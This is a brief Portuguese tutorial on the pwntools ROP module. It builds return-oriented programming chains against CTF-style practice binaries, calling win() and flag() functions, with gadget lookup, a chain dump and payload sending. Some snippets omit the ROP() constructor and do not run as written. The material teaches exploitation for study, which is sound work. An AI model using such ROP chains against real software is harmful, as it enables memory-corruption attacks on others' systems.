# ROP

O modulo `ROP` é poderoso e colabora na criação de ropchains com menos linhas de código.

## Criando um objeto ROP

```python
rop = ROP([])
```

## Adicionando Padding

```python
rop.raw('A' * 64)
```

## Adicionando valores empacotados

```python
rop.raw(0x12345678)
```

## Buscando simples gadgets
```python
rop = ('./vulnerable_program')
# buscando gadget 'pop rdi, ret'
pop_rdi_ret_address = p64(rop.rdi.address)
# buscando gadget 'ret'
ret_address = p64(rop.ret.address)
```

## Chamando a função win\(\)

```python
rop = ('./vulnerable_program')
rop.win()
```

Passando parametros para a função:

```python
rop = ('./vulnerable_program')
rop.win(0xdeadc0de, 0xdeadbeef)
```

## Dumping a chain ROP

```python
from pwn import *

elf = context.binary = ELF('./showcase')
rop = ROP(elf)

rop.win1(0x12345678)
rop.win2(0xdeadbeef, 0xdeadc0de)
rop.flag(0xc0ded00d)

print(rop.dump())
```

`dump()` output:

```text
0x0000:         0x40118b pop rdi; ret
0x0008:       0x12345678 [arg0] rdi = 305419896
0x0010:         0x401102 win1
0x0018:         0x40118b pop rdi; ret
0x0020:       0xdeadbeef [arg0] rdi = 3735928559
0x0028:         0x401189 pop rsi; pop r15; ret
0x0030:       0xdeadc0de [arg1] rsi = 3735929054
0x0038:       'oaaapaaa' <pad r15>
0x0040:         0x40110c win2
0x0048:         0x40118b pop rdi; ret
0x0050:       0xc0ded00d [arg0] rdi = 3235827725
0x0058:         0x401119 flag
```

## Enviando a Chain

```python
p.sendline(rop.chain())
```

## Showcase

Sem pwntools:

```python
payload = flat(
    POP_RDI,
    0xdeadc0de,
    elf.sym['win1'],
    POP_RDI,
    0xdeadbeef,
    POP_RSI,
    0x98765432,
    elf.sym['win2'],
    POP_RDI,
    0x54545454,
    elf.sym['flag']
)

p.sendline(payload)
```

Com pwntools:

```python
rop.win1(0xdeadc0de)
rop.win2(0xdeadbeef, 0x98765432)
rop.flag(0x54545454)

p.sendline(rop.chain())
```

